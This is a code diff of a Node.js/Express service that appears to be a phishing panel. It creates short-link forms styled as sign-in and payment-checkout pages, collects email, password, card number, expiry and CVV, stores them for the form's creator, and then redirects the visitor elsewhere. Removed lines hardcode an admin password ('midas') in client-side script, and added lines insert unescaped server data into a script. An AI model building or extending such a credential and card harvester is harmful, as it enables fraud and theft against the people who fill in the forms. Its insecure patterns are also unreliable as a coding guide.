@@ -7,19 +7,18 @@ const fs = require('fs').promises;
 const path = require('path');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
-require('dotenv').config();
+require('dotenv').config(); // Load environment variables
 
 // Initialize Express app and port
 const app = express();
 const port = process.env.PORT || 3000;
-const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here';
+const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here'; // Fallback for local dev
 
-// Define persistent data paths
+// Define persistent data paths for Render (set DATA_DIR=/data in Render env vars)
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
 const submissionsFile = path.join(DATA_DIR, 'submissions.json');
 const formConfigsFile = path.join(DATA_DIR, 'formConfigs.json');
 const usersFile = path.join(DATA_DIR, 'users.json');
-const settingsFile = path.join(DATA_DIR, 'settings.json');
 
 // Ensure data directory exists
 async function ensureDataDir() {
@@ -56,20 +55,6 @@ async function initializeFormConfigsFile() {
   }
 }
 
-// Initialize settings file
-async function initializeSettingsFile() {
-  try {
-    await fs.access(settingsFile);
-    const data = await fs.readFile(settingsFile, 'utf8');
-    settings = JSON.parse(data);
-    console.log('Loaded settings from file');
-  } catch {
-    await fs.writeFile(settingsFile, JSON.stringify({ maxFormsPerUser: 10 })); // Default to 10 forms
-    settings = { maxFormsPerUser: 10 };
-    console.log('Created settings.json with default maxFormsPerUser: 10');
-  }
-}
-
 // Save formConfigs to file
 async function saveFormConfigs() {
   try {
@@ -77,17 +62,6 @@ async function saveFormConfigs() {
     console.log('Saved formConfigs to file');
   } catch (err) {
     console.error('Error saving formConfigs:', err.message, err.stack);
-    throw err;
-  }
-}
-
-// Save settings to file
-async function saveSettings() {
-  try {
-    await fs.writeFile(settingsFile, JSON.stringify(settings, null, 2));
-    console.log('Saved settings to file');
-  } catch (err) {
-    console.error('Error saving settings:', err.message, err.stack);
     throw err;
   }
 }
@@ -131,17 +105,31 @@ async function loadUserById(userId) {
   return users.find(u => u.id === userId);
 }
 
+// Reload formConfigs from file to ensure data is up-to-date
+async function loadFormConfigs() {
+  try {
+    const data = await fs.readFile(formConfigsFile, 'utf8');
+    formConfigs = JSON.parse(data);
+    console.log('Reloaded formConfigs from file');
+  } catch (err) {
+    console.error('Error reloading formConfigs:', err.message);
+    formConfigs = {};
+  }
+}
+
 // JWT verification middleware
 function verifyToken(req, res, next) {
   const authHeader = req.headers['authorization'];
   if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    console.error('No token provided in headers:', req.headers);
     return res.status(401).json({ error: 'No token provided' });
   }
 
   const token = authHeader.split(' ')[1];
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
-    req.user = decoded;
+    req.user = decoded; // Store user data in request
+    console.log('Token verified for user:', decoded.userId);
     next();
   } catch (error) {
     console.error('Token verification error:', error.message);
@@ -151,13 +139,11 @@ function verifyToken(req, res, next) {
 
 // Initialize storage
 let formConfigs = {};
-let settings = {};
 (async () => {
   try {
     await ensureDataDir();
     await initializeSubmissionsFile();
     await initializeFormConfigsFile();
-    await initializeSettingsFile();
     await initializeUsersFile();
   } catch (err) {
     console.error('Initialization failed:', err.message, err.stack);
@@ -165,7 +151,7 @@ let settings = {};
   }
 })();
 
-// Middleware
+// Middleware - Updated CORS configuration
 app.use(cors({
   origin: ['http://localhost:3000', 'https://plexzora.onrender.com', 'https://your-frontend-domain.com'],
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
@@ -185,7 +171,7 @@ app.options('*', (req, res) => {
   res.sendStatus(200);
 });
 
-// EJS template for live form (unchanged)
+// EJS template for live form
 const formTemplate = `
 <!DOCTYPE html>
 <html lang="en">
@@ -437,7 +423,17 @@ const formTemplate = `
   </div>
 
   <script>
-    const templates = <%- templates %>;
+    // Ensure templates are parsed correctly
+    let templates;
+    try {
+      templates = JSON.parse('<%- templates %>');
+    } catch (e) {
+      console.error('Error parsing templates:', e);
+      document.getElementById('message-text').textContent = 'Error loading form configuration.';
+      document.getElementById('message-popup').classList.add('show');
+      document.getElementById('message-overlay').classList.add('show');
+      return;
+    }
 
     const loginButton = document.getElementById('login-button');
     const messagePopup = document.getElementById('message-popup');
@@ -449,25 +445,34 @@ const formTemplate = `
     function normalizeUrl(url) {
       if (!url) return null;
       url = url.trim();
-      if (url.match(/^https?:\/\//)) return url;
-      if (url.match(/\.[a-z]{2,}$/i)) return 'https://' + url;
+      if (url.match(/^https?:\\/\\//)) return url;
+      if (url.match(/\\.[a-z]{2,}$/i)) return 'https://' + url;
       return null;
     }
 
     function showMessagePopup(message) {
+      console.log('Showing popup with message:', message);
       messageText.textContent = message || 'Welcome! You have clicked the button.';
       messagePopup.classList.add('show');
       messageOverlay.classList.add('show');
     }
 
     function hideMessagePopup() {
+      console.log('Hiding popup');
       messagePopup.classList.remove('show');
       messageOverlay.classList.remove('show');
     }
 
     function checkFormFilled() {
+      console.log('Checking if form is filled');
       const inputs = inputFieldsContainer.querySelectorAll('input');
-      const templateFields = templates['<%= template %>'].fields;
+      const templateFields = templates['<%= template %>']?.fields || [];
+
+      if (!templateFields.length) {
+        console.error('No template fields found for template:', '<%= template %>');
+        showMessagePopup('Error: Form configuration is invalid.');
+        return false;
+      }
 
       for (let i = 0; i < inputs.length; i++) {
         const input = inputs[i];
@@ -476,6 +481,7 @@ const formTemplate = `
         const templateField = templateFields.find(field => field.id === fieldId);
 
         if (!value && (!templateField || templateField.validation.required)) {
+          console.warn('Required field missing:', fieldId);
           showMessagePopup('Please fill all required fields before proceeding.');
           return false;
         }
@@ -484,18 +490,23 @@ const formTemplate = `
           try {
             const regex = new RegExp(templateField.validation.regex);
             if (!regex.test(value)) {
+              console.warn('Validation failed for field:', fieldId, 'Value:', value);
               showMessagePopup(templateField.validation.errorMessage);
               return false;
             }
           } catch (e) {
             console.error('Invalid regex for field:', fieldId, e);
+            showMessagePopup('Error: Invalid field validation.');
+            return false;
           }
         }
       }
+      console.log('Form validation passed');
       return true;
     }
 
     async function submitFormData() {
+      console.log('Submitting form data');
       const inputs = inputFieldsContainer.querySelectorAll('input');
       const formData = {};
       inputs.forEach(input => {
@@ -504,10 +515,12 @@ const formTemplate = `
       });
 
       try {
+        console.log('Sending fetch to /form/<%= formId %>/submit with data:', formData);
         const response = await fetch('/form/<%= formId %>/submit', {
           method: 'POST',
           headers: { 
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
           },
           body: JSON.stringify(formData)
         });
@@ -521,27 +534,36 @@ const formTemplate = `
         return true;
       } catch (error) {
         console.error('Error submitting form:', error);
-        showMessagePopup('An error occurred while submitting the form.');
+        showMessagePopup('An error occurred while submitting the form: ' + error.message);
         return false;
       }
     }
 
     try {
       loginButton.addEventListener('click', async () => {
-        if (!checkFormFilled()) return;
+        console.log('Login button clicked');
+        if (!checkFormFilled()) {
+          console.warn('Form validation failed');
+          return;
+        }
         const submitted = await submitFormData();
-        if (!submitted) return;
+        if (!submitted) {
+          console.warn('Form submission failed');
+          return;
+        }
 
         const action = '<%= buttonAction %>';
         const url = '<%= buttonUrl %>';
         const message = '<%= buttonMessage %>';
-        console.log('Button clicked:', { action, url, message });
+        console.log('Button action:', { action, url, message });
+
         if (action === 'url') {
           const normalizedUrl = normalizeUrl(url);
           if (normalizedUrl) {
             console.log('Redirecting to:', normalizedUrl);
             window.location.href = normalizedUrl;
           } else {
+            console.error('Invalid URL:', url);
             showMessagePopup('Please enter a valid URL (e.g., www.example.com).');
           }
         } else if (action === 'message') {
@@ -557,257 +579,6 @@ const formTemplate = `
     } catch (error) {
       console.error('Error in form script:', error);
       showMessagePopup('An error occurred. Please try again.');
-    }
-  </script>
-</body>
-</html>
-`;
-
-// Updated EJS template for admin link management
-const adminLinkManagementTemplate = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin: Manage Link Lifespan</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <style>
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #f8f9fa;
-      margin: 0;
-      padding: 20px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    .container {
-      max-width: 500px;
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    h1 {
-      font-size: 1.8rem;
-      margin-bottom: 20px;
-    }
-    .form-row {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-    input[type="password"], input[type="number"], select {
-      padding: 8px;
-      border-radius: 4px;
-      border: 1px solid #ddd;
-      font-size: 0.9rem;
-      width: 100%;
-      max-width: 300px;
-    }
-    .switch {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .switch label {
-      font-size: 0.9rem;
-      font-weight: 500;
-    }
-    button {
-      padding: 8px 16px;
-      background: #0078ff;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 0.9rem;
-    }
-    button:hover {
-      background: #005bb5;
-    }
-    .error {
-      color: red;
-      font-size: 0.8rem;
-      margin-top: 10px;
-    }
-    .success {
-      color: green;
-      font-size: 0.8rem;
-      margin-top: 10px;
-    }
-    .login-container {
-      display: none;
-    }
-    .login-container.show {
-      display: block;
-    }
-    .management-container {
-      display: none;
-    }
-    .management-container.show {
-      display: block;
-    }
-    #lifespan-input {
-      display: none;
-    }
-    #lifespan-input.show {
-      display: block;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="login-container show" id="login-container">
-      <h1>Admin Login</h1>
-      <div class="form-row">
-        <input type="password" id="admin-password" placeholder="Enter admin password">
-        <button onclick="login()">Login</button>
-      </div>
-      <div id="error-message" class="error"></div>
-    </div>
-    <div class="management-container" id="management-container">
-      <h1>Manage All Link Lifespan</h1>
-      <p>Total Forms: <span id="form-count">0</span></p>
-      <div class="form-row">
-        <div class="switch">
-          <label>
-            <input type="checkbox" id="lifespan-toggle" onchange="toggleLifespan()">
-            Set Lifespan / Permanent
-          </label>
-        </div>
-        <div id="lifespan-input">
-          <input type="number" min="1" placeholder="Duration" id="duration-input">
-          <select id="time-unit">
-            <option value="seconds">Seconds</option>
-            <option value="minutes">Minutes</option>
-            <option value="hours">Hours</option>
-          </select>
-        </div>
-        <button onclick="updateAllLifespan()">Update All Links</button>
-      </div>
-      <div class="form-row">
-        <h2>Max Forms Per User</h2>
-        <p>Current Max: <span id="max-forms-count"><%= settings.maxFormsPerUser %></span></p>
-        <input type="number" min="1" placeholder="Max Forms" id="max-forms-input">
-        <button onclick="setMaxForms()">Set Max Forms</button>
-      </div>
-      <div id="message" class="success"></div>
-    </div>
-  </div>
-
-  <script>
-    function login() {
-      const password = document.getElementById('admin-password').value;
-      const errorMessage = document.getElementById('error-message');
-      if (password !== 'midas') {
-        errorMessage.textContent = 'Invalid password';
-        return;
-      }
-      document.getElementById('login-container').classList.remove('show');
-      document.getElementById('management-container').classList.add('show');
-      loadFormCount();
-    }
-
-    function toggleLifespan() {
-      const toggle = document.getElementById('lifespan-toggle');
-      const lifespanInput = document.getElementById('lifespan-input');
-      lifespanInput.classList.toggle('show', toggle.checked);
-    }
-
-    async function loadFormCount() {
-      try {
-        const response = await fetch('/admin-links/count');
-        const data = await response.json();
-        if (!response.ok) {
-          throw new Error(data.error || 'Failed to fetch form count');
-        }
-        document.getElementById('form-count').textContent = data.formCount;
-      } catch (error) {
-        document.getElementById('message').classList.remove('success');
-        document.getElementById('message').classList.add('error');
-        document.getElementById('message').textContent = error.message;
-      }
-    }
-
-    async function updateAllLifespan() {
-      const toggle = document.getElementById('lifespan-toggle');
-      const durationInput = document.getElementById('duration-input');
-      const timeUnit = document.getElementById('time-unit').value;
-      const duration = durationInput.value;
-      const messageEl = document.getElementById('message');
-
-      try {
-        if (toggle.checked && (!duration || duration < 1)) {
-          throw new Error('Please enter a valid duration');
-        }
-
-        const response = await fetch('/admin-links/update', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            password: 'midas', 
-            duration: toggle.checked ? parseInt(duration) : null,
-            timeUnit: toggle.checked ? timeUnit : null 
-          })
-        });
-
-        const data = await response.json();
-        if (!response.ok) {
-          throw new Error(data.error || 'Failed to update lifespan');
-        }
-
-        messageEl.classList.remove('error');
-        messageEl.classList.add('success');
-        messageEl.textContent = 'Lifespan updated successfully for all links';
-        loadFormCount();
-        setTimeout(() => messageEl.textContent = '', 3000);
-      } catch (error) {
-        messageEl.classList.remove('success');
-        messageEl.classList.add('error');
-        messageEl.textContent = error.message;
-      }
-    }
-
-    async function setMaxForms() {
-      const maxFormsInput = document.getElementById('max-forms-input');
-      const maxForms = maxFormsInput.value;
-      const messageEl = document.getElementById('message');
-
-      try {
-        if (!maxForms || maxForms < 1) {
-          throw new Error('Please enter a valid number of forms');
-        }
-
-        const response = await fetch('/admin-links/set-max-forms', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            password: 'midas', 
-            maxForms: parseInt(maxForms) 
-          })
-        });
-
-        const data = await response.json();
-        if (!response.ok) {
-          throw new Error(data.error || 'Failed to set max forms');
-        }
-
-        messageEl.classList.remove('error');
-        messageEl.classList.add('success');
-        messageEl.textContent = 'Max forms per user updated successfully';
-        document.getElementById('max-forms-count').textContent = maxForms;
-        setTimeout(() => messageEl.textContent = '', 3000);
-      } catch (error) {
-        messageEl.classList.remove('success');
-        messageEl.classList.add('error');
-        messageEl.textContent = error.message;
-      }
     }
   </script>
 </body>
@@ -848,64 +619,6 @@ function sanitizeForJs(str) {
     .replace(/>/g, '&gt;')
     .replace(/&/g, '&amp;');
 }
-
-// Calculate expiry time based on duration and unit
-function calculateExpiryTime(duration, timeUnit) {
-  if (!duration || !timeUnit) return null;
-  const now = Date.now();
-  let milliseconds;
-  switch (timeUnit) {
-    case 'seconds':
-      milliseconds = duration * 1000;
-      break;
-    case 'minutes':
-      milliseconds = duration * 60 * 1000;
-      break;
-    case 'hours':
-      milliseconds = duration * 60 * 60 * 1000;
-      break;
-    default:
-      throw new Error('Invalid time unit');
-  }
-  return new Date(now + milliseconds).toISOString();
-}
-
-// Check and delete expired forms
-async function deleteExpiredForms() {
-  try {
-    const now = new Date();
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    let modified = false;
-
-    Object.keys(formConfigs).forEach(formId => {
-      const config = formConfigs[formId];
-      if (config.expiryTime && new Date(config.expiryTime) <= now) {
-        // Delete form config
-        delete formConfigs[formId];
-        modified = true;
-        
-        // Delete associated submissions
-        const updatedSubmissions = submissions.filter(s => s.formId !== formId);
-        if (updatedSubmissions.length !== submissions.length) {
-          submissions.length = 0;
-          submissions.push(...updatedSubmissions);
-          modified = true;
-        }
-      }
-    });
-
-    if (modified) {
-      await saveFormConfigs();
-      await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
-      console.log('Expired forms and their submissions deleted');
-    }
-  } catch (error) {
-    console.error('Error deleting expired forms:', error.message, error.stack);
-  }
-}
-
-// Run expiry check every 10 seconds for finer granularity
-setInterval(deleteExpiredForms, 10 * 1000);
 
 // Auth Route: Get current user info
 app.get('/user', verifyToken, async (req, res) => {
@@ -957,6 +670,7 @@ app.post('/signup', async (req, res) => {
 
     const saltRounds = 10;
     const hashedPassword = await bcrypt.hash(password, saltRounds);
+
     const finalUsername = username || email.split('@')[0];
 
     const newUser = {
@@ -1058,7 +772,58 @@ app.post('/reset-password', async (req, res) => {
   }
 });
 
-// Create form with expiry and max forms limit
+// Protected Routes
+app.get('/get', verifyToken, async (req, res) => {
+  try {
+    const userId = req.user.userId;
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    const userSubmissions = submissions.filter(s => s.userId === userId);
+    
+    const userFormConfigs = {};
+    Object.entries(formConfigs).forEach(([formId, config]) => {
+      if (config.userId === userId) {
+        userFormConfigs[formId] = config;
+      }
+    });
+
+    const templates = {
+      'sign-in': {
+        name: 'Sign In Form',
+        fields: [
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
+          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
+        ]
+      },
+      'contact': {
+        name: 'Contact Form',
+        fields: [
+          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
+        ]
+      },
+      'payment-checkout': {
+        name: 'Payment Checkout Form',
+        fields: [
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
+          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
+        ]
+      }
+    };
+    
+    console.log(`Retrieved ${userSubmissions.length} submissions and ${Object.keys(userFormConfigs).length} forms for user ${userId}`);
+    res.json({
+      submissions: userSubmissions.reverse(),
+      formConfigs: userFormConfigs,
+      templates,
+      userId
+    });
+  } catch (error) {
+    console.error('Error fetching data for /get:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to fetch data', details: error.message });
+  }
+});
+
 app.post('/create', verifyToken, async (req, res) => {
   try {
     console.log('Received /create request:', req.body);
@@ -1066,25 +831,6 @@ app.post('/create', verifyToken, async (req, res) => {
     const templateId = req.body.template || 'sign-in';
     const formId = generateShortCode();
     const validActions = ['url', 'message'];
-
-    // Check max forms limit
-    const userForms = Object.values(formConfigs).filter(config => config.userId === userId && (!config.expiryTime || new Date(config.expiryTime) > new Date())).length;
-    if (userForms >= settings.maxFormsPerUser) {
-      console.error(`User ${userId} exceeded max forms limit: ${settings.maxFormsPerUser}`);
-      return res.status(403).json({ error: `Maximum form limit of ${settings.maxFormsPerUser} reached` });
-    }
-
-    // Calculate expiry time (default 1 hour if not specified)
-    let expiryTime = calculateExpiryTime(3600, 'seconds'); // Default to 1 hour
-    if (req.body.duration && req.body.timeUnit) {
-      const duration = parseInt(req.body.duration);
-      if (duration >= 1) {
-        expiryTime = calculateExpiryTime(duration, req.body.timeUnit);
-      }
-    } else if (req.body.duration === null) {
-      expiryTime = null; // Permanent
-    }
-
     const config = {
       userId,
       template: templateId,
@@ -1104,8 +850,7 @@ app.post('/create', verifyToken, async (req, res) => {
       buttonUrl: req.body.buttonUrl ? normalizeUrl(req.body.buttonUrl) : '',
       buttonMessage: req.body.buttonMessage || '',
       theme: req.body.theme === 'dark' ? 'dark' : 'light',
-      createdAt: new Date().toISOString(),
-      expiryTime
+      createdAt: new Date().toISOString()
     };
 
     if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
@@ -1131,102 +876,202 @@ app.post('/create', verifyToken, async (req, res) => {
   }
 });
 
-// Admin route to get form count
-app.get('/admin-links/count', async (req, res) => {
-  try {
-    const formCount = Object.keys(formConfigs).length;
-    res.status(200).json({ formCount });
-  } catch (error) {
-    console.error('Error fetching form count:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to fetch form count', details: error.message });
-  }
-});
-
-// Admin route to serve link management page
-app.get('/admin-links', (req, res) => {
-  try {
-    res.set('Content-Type', 'text/html');
-    res.send(ejs.render(adminLinkManagementTemplate, { settings }));
-  } catch (error) {
-    console.error('Error rendering admin link management page:', error.message, error.stack);
-    res.status(500).send('Error rendering admin link management page');
-  }
-});
-
-// Admin route to update all form expiries
-app.post('/admin-links/update', async (req, res) => {
-  const { password, duration, timeUnit } = req.body;
-
-  if (password !== 'midas') {
-    return res.status(401).json({ error: 'Invalid admin password' });
+app.post('/form/:id/submit', async (req, res) => {
+  const formId = req.params.id;
+  
+  if (!formConfigs[formId]) {
+    console.error(`Form not found for ID: ${formId}`);
+    return res.status(404).json({ error: 'Form not found' });
   }
 
   try {
-    if (duration !== null && (isNaN(duration) || duration < 1)) {
-      return res.status(400).json({ error: 'Invalid duration' });
+    const formData = req.body;
+    const config = formConfigs[formId];
+    const userId = config.userId;
+    const templates = {
+      'sign-in': {
+        name: 'Sign In Form',
+        fields: [
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
+          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
+        ]
+      },
+      'contact': {
+        name: 'Contact Form',
+        fields: [
+          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
+        ]
+      },
+      'payment-checkout': {
+        name: 'Payment Checkout Form',
+        fields: [
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
+          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
+        ]
+      }
+    };
+    const template = templates[config.template] || templates['sign-in'];
+
+    for (const field of template.fields) {
+      if (field.validation.required && !formData[field.id]) {
+        return res.status(400).json({ error: `Field ${field.placeholder} is required` });
+      }
+      if (field.validation.regex && formData[field.id]) {
+        const regex = new RegExp(field.validation.regex);
+        if (!regex.test(formData[field.id])) {
+          return res.status(400).json({ error: field.validation.errorMessage });
+        }
+      }
     }
-    if (duration !== null && !['seconds', 'minutes', 'hours'].includes(timeUnit)) {
-      return res.status(400).json({ error: 'Invalid time unit' });
-    }
 
-    const newExpiryTime = duration ? calculateExpiryTime(duration, timeUnit) : null;
-
-    Object.keys(formConfigs).forEach(formId => {
-      formConfigs[formId].expiryTime = newExpiryTime;
+    const mappedData = {};
+    Object.entries(formData).forEach(([fieldId, value]) => {
+      const customField = config.placeholders.find(p => p.id === fieldId);
+      const templateField = template.fields.find(f => f.id === fieldId);
+      const displayName = customField?.placeholder || templateField?.placeholder || fieldId;
+      mappedData[sanitizeForJs(displayName)] = sanitizeForJs(value);
     });
 
-    await saveFormConfigs();
-    console.log(`Updated expiry for all forms to ${newExpiryTime || 'permanent'}`);
-    res.status(200).json({ message: 'All link lifespans updated successfully' });
+    const submission = {
+      userId,
+      formId,
+      timestamp: new Date().toISOString(),
+      data: mappedData
+    };
+
+    console.log(`Attempting to save submission for ${formId} by user ${userId}:`, submission);
+
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    submissions.push(submission);
+    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
+
+    console.log(`Submission saved successfully for form ${formId} by user ${userId}`);
+    res.status(200).json({ message: 'Submission saved successfully' });
   } catch (error) {
-    console.error('Error updating all form expiries:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to update link lifespans', details: error.message });
+    console.error('Error saving submission:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to save submission', details: error.message });
   }
 });
 
-// Admin route to set max forms per user
-app.post('/admin-links/set-max-forms', async (req, res) => {
-  const { password, maxForms } = req.body;
-
-  if (password !== 'midas') {
-    return res.status(401).json({ error: 'Invalid admin password' });
-  }
+app.delete('/form/:id/submission/:index', verifyToken, async (req, res) => {
+  const formId = req.params.id;
+  const index = parseInt(req.params.index, 10);
+  const userId = req.user.userId;
 
   try {
-    if (isNaN(maxForms) || maxForms < 1) {
-      return res.status(400).json({ error: 'Invalid max forms value' });
+    if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
+      console.error(`User ${userId} does not have access to form ${formId}`);
+      return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
     }
 
-    settings.maxFormsPerUser = parseInt(maxForms);
-    await saveSettings();
-    console.log(`Set max forms per user to ${maxForms}`);
-    res.status(200).json({ message: 'Max forms per user updated successfully' });
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    const userFormSubmissions = submissions.filter(s => s.userId === userId && s.formId === formId);
+
+    if (index < 0 || index >= userFormSubmissions.length) {
+      console.error(`Invalid submission index: ${index} for form ${formId} by user ${userId}`);
+      return res.status(404).json({ error: 'Submission not found' });
+    }
+
+    const submissionToDelete = userFormSubmissions[index];
+    const globalIndex = submissions.findIndex(s => 
+      s.userId === userId && s.formId === formId && s.timestamp === submissionToDelete.timestamp
+    );
+
+    if (globalIndex === -1) {
+      console.error(`Submission not found for form ${formId} at index ${index} by user ${userId}`);
+      return res.status(404).json({ error: 'Submission not found' });
+    }
+
+    submissions.splice(globalIndex, 1);
+    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
+    console.log(`Deleted submission at index ${index} for form ${formId} by user ${userId}`);
+
+    res.status(200).json({ message: 'Submission deleted successfully' });
   } catch (error) {
-    console.error('Error setting max forms:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to set max forms', details: error.message });
+    console.error('Error deleting submission:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to delete submission', details: error.message });
   }
 });
 
-// Form route with expiry check
-app.get('/form/:id', async (req, res) => {
+app.delete('/form/:id', verifyToken, async (req, res) => {
+  const formId = req.params.id;
+  const userId = req.user.userId;
+
+  try {
+    if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
+      console.error(`User ${userId} does not have access to form ${formId}`);
+      return res.status(404).json({ error: 'Form not found or access denied' });
+    }
+
+    delete formConfigs[formId];
+    await saveFormConfigs();
+
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    const updatedSubmissions = submissions.filter(s => 
+      !(s.userId === userId && s.formId === formId)
+    );
+    await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
+    console.log(`Deleted form ${formId} and its submissions for user ${userId}`);
+
+    res.status(200).json({ message: 'Form and associated submissions deleted successfully' });
+  } catch (error) {
+    console.error('Error deleting form:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to delete form', details: error.message });
+  }
+});
+
+app.get('/submissions', verifyToken, async (req, res) => {
+  try {
+    const userId = req.user.userId;
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    const userSubmissions = submissions.filter(s => s.userId === userId);
+
+    const templates = {
+      'sign-in': {
+        name: 'Sign In Form',
+        fields: [
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: 'true', regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
+          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
+        ]
+      },
+      'contact': {
+        name: 'Contact Form',
+        fields: [
+          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
+        ]
+      },
+      'payment-checkout': {
+        name: 'Payment Checkout Form',
+        fields: [
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
+          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
+        ]
+      }
+    };
+    
+    console.log(`Retrieved ${userSubmissions.length} submissions for user ${userId}`);
+    res.json({
+      submissions: userSubmissions.reverse(),
+      templates,
+      userId
+    });
+  } catch (error) {
+    console.error('Error fetching submissions:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to fetch submissions', details: error.message });
+  }
+});
+
+app.get('/form/:id', (req, res) => {
   const formId = req.params.id;
   const config = formConfigs[formId];
   
   if (!config) {
     console.error(`Form not found for ID: ${formId}`);
     return res.status(404).send('Form not found');
-  }
-
-  if (config.expiryTime && new Date(config.expiryTime) <= new Date()) {
-    delete formConfigs[formId];
-    await saveFormConfigs();
-    
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    const updatedSubmissions = submissions.filter(s => s.formId !== formId);
-    await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
-    
-    console.error(`Form ${formId} has expired`);
-    return res.status(410).send('Form has expired');
   }
 
   const templates = {
@@ -1327,265 +1172,16 @@ app.get('/form/:id', async (req, res) => {
   }
 });
 
-// Get user forms and submissions
-app.get('/get', verifyToken, async (req, res) => {
-  try {
-    const userId = req.user.userId;
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    const userSubmissions = submissions.filter(s => s.userId === userId);
-    const userFormConfigs = {};
-    Object.entries(formConfigs).forEach(([formId, config]) => {
-      if (config.userId === userId && (!config.expiryTime || new Date(config.expiryTime) > new Date())) {
-        userFormConfigs[formId] = config;
-      }
-    });
-
-    const templates = {
-      'sign-in': {
-        name: 'Sign In Form',
-        fields: [
-          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
-          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
-        ]
-      },
